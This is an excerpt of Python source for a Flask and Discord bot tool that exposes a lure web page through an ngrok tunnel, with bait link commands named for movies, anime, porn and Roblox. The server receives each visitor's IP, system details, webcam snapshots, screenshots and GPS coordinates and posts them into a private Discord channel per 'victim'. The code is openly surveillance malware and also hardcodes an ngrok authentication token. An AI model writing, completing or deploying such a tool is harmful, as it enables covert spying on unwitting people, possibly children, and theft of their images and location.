...
# SAFE NGROK CONFIG
NGROK_TOKEN = "3CF58eB63iGopGF4aoAiLnmvCk8_5Kg4or7thEAj2xsBqm6Cm"
config_path = r"C:\Users\asahr\ngrok.yml"
os.environ["PYNGROK_CONFIG"] = config_path
conf.get_default().config_path = config_path
with open(config_path, "w", encoding="utf-8") as f:
    f.write(f"""version: 2
authtoken: {NGROK_TOKEN}
""")
print("DEBUG: ngrok.yml created safely")
...
app = Flask(__name__)
CATEGORY_ID = 1468316561864392734
ROLE_ID = 1476792990927159326
YOUR_GUILD_ID = 1442455297120800856
...
# === HORRIFIC ANIMATED OXBLOOD VOID PAGE ===
...
def new_victim():
    ...
    channel_name = sanitize_ip(ip)
    channel = discord.utils.get(guild.text_channels, name=channel_name)

    if not channel:
        overwrites = {guild.default_role: discord.PermissionOverwrite(read_messages=False), guild.get_role(ROLE_ID): discord.PermissionOverwrite(read_messages=True), guild.me: discord.PermissionOverwrite(read_messages=True)}
        channel = asyncio.run_coroutine_threadsafe(category.create_text_channel(channel_name, overwrites=overwrites), bot.loop).result()
        victim_channels[ip] = channel

        embed = discord.Embed(color=EMBED_COLOR)
        description = "".join(f"**{key}:** `{value}`\n" for key, value in system.items())
        embed.description = description.strip()
        asyncio.run_coroutine_threadsafe(channel.send(embed=embed), bot.loop).result()
...
def update():
    data = request.json
    ip = data["ip"]
    channel = victim_channels.get(ip)
    if not channel:
    ...
    embed.description = f"**{timestamp}**\n\n"
    if data.get("webcam"):
        file_data = base64.b64decode(data["webcam"].split(",")[1])
        files.append(discord.File(io.BytesIO(file_data), filename="webcam.png"))
        embed.set_image(url="attachment://webcam.png")
    if data.get("screenshot"):
        file_data = base64.b64decode(data["screenshot"].split(",")[1])
        files.append(discord.File(io.BytesIO(file_data), filename="screenshot.png"))
        embed.set_thumbnail(url="attachment://screenshot.png")
    if data.get("lat") is not None:
        embed.description += f"**Latitude:** `{data.get('lat')}`\n**Longitude:** `{data.get('lon')}`\n**Altitude:** `{data.get('alt')}`"
    asyncio.run_coroutine_threadsafe(channel.send(embed=embed, files=files if files else None), bot.loop).result()
    return jsonify({"status": "ok"})
...
async def on_message(message):
    ...
    if content == ";create":
        if current_ngrok_url:
            await channel.send(embed=discord.Embed(description=f"`{current_ngrok_url}`", color=EMBED_COLOR))
            return
        try:
            conf.get_default().auth_token = NGROK_TOKEN
            tunnel = ngrok.connect(8080, "http")
            current_ngrok_url = tunnel.public_url
            await channel.send(embed=discord.Embed(description=f"`{current_ngrok_url}`", color=EMBED_COLOR))
        except Exception as e:
            await channel.send(embed=discord.Embed(description=f"Error: {e}", color=EMBED_COLOR))
        return

    # ;link
    if content == ";link":
        if not current_ngrok_url:
            await channel.send(embed=discord.Embed(description="No active link", color=EMBED_COLOR))
            return
        await channel.send(embed=discord.Embed(description=f"`{current_ngrok_url}`", color=EMBED_COLOR))
        return
    ...
    if content == ";refresh":
        ...
        try:
            ...
            tunnel = ngrok.connect(8080, "http")
            current_ngrok_url = tunnel.public_url
            await channel.send(embed=discord.Embed(description=f"**Refreshed:** `{current_ngrok_url}`", color=EMBED_COLOR))
        except Exception as e:
            await channel.send(embed=discord.Embed(description=f"Error: {e}", color=EMBED_COLOR))
        return

    # rest of original commands remain unchanged
    ...
    if content in (";link", ";movies", ";anime", ";porn", ";roblox"):
